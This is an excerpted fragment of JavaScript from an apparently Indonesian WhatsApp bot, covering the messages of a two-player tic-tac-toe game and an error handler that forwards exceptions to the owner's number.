giie.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}
...
${ttt}`
giie.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
...
${ttt}`
giie.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
...
Giliran = @${tty.player1.split('@')[0]}`
 giie.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
     ...
     giie.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*𝗠𝗔𝗔𝗙 𝗘𝗥𝗥𝗢𝗥 𝗧𝗘𝗥𝗝𝗔𝗗𝗜 :*\n${e}`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./thub.jpg'),sourceUrl:"https://instagram.com/giiexsala"}}})
	}
    }
    }
    }
